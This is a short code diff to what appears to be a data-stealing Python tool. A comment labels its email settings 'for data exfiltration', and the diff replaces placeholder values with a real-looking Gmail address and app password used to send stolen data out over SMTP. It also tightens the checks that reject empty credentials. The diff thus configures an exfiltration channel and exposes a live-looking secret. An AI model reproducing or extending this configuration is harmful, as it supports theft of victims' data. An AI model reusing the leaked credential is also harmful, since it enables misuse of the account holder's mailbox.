@@ -21,8 +21,8 @@ from core.crypto_utils import obfuscate_string, deobfuscate_string
 
 # Email configuration for data exfiltration
 EMAIL_CONFIG = {
-    'email': 'your_email@gmail.com',  # Replace with your email
-    'password': 'your_app_password',  # Replace with your app password
+    'email': 'coccoder999@gmail.com',  # Replace with your email
+    'password': 'plby syha oaga jwtu',  # Replace with your app password
     'smtp_server': 'smtp.gmail.com',  # Gmail SMTP server
     'smtp_port': 587,                 # TLS port
     'use_tls': True
@@ -61,12 +61,12 @@ def setup_logging():
 
 def validate_config():
     """Validate configuration before starting."""
-    if EMAIL_CONFIG['email'] == 'your_email@gmail.com':
+    if EMAIL_CONFIG['email'] == 'your_email@gmail.com' or EMAIL_CONFIG['email'] == '':
         print("ERROR: Please configure your email settings in main.py")
         print("Update EMAIL_CONFIG with your actual email and password")
         return False
     
-    if EMAIL_CONFIG['password'] == 'your_app_password':
+    if EMAIL_CONFIG['password'] == 'your_app_password' or EMAIL_CONFIG['password'] == '':
         print("ERROR: Please configure your email password in main.py")
         print("Use an app password for Gmail (not your regular password)")
         return False
